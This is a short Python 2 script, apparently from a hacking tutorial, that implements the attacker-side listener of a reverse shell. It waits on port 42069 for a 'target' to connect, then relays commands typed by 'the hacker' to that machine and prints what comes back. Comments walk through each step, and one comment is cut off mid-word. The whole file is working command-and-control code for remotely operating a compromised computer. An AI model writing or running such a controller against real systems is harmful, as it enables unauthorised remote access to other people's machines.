#!/usr/bin/python

import socket
import json # Using this to send and receive as much data we want

def reliable_send(data):
	json_data = json.dumps(data)
	target.send(json_data)

def reliable_recv():
	json_data = ""
	while True:
		try:
			json_data = json_data + target.recv(1024) # The first 1024 bytes is received, but some data remains and that raises an error, control goes to except block, after which further data is "appended" to json_data.

			return json.loads(json_data)
		except ValueError:
			continue

def shell():
	while True:
		# Inputting the command from the hacker.
		command = raw_input("* Shell#~%s: " %str(ip))

		# Sending the command to the client.
		reliable_send(command)
		if command == 'q':
			break
		elif command[0:3] == 'cd ' and len(command) > 2:
			continue
		else:
			# Receiving the info from client (no of bytes)
			output = reliable_recv()

			print output
def server():
	global s, ip, target
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # AF_INET specifies that socket will be IPv4, SOC>

	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Options for the socket.

	s.bind(("127.0.0.1", 42069)) # Binding the socket to an IP address and a port

	s.listen(5) # Means that it will listen for 5 connections
	print "Listening for incoming connections"

	target, ip = s.accept() # Accepting the connection from the target machine.

	print "Target Connected!"

server()
shell()
s.close()
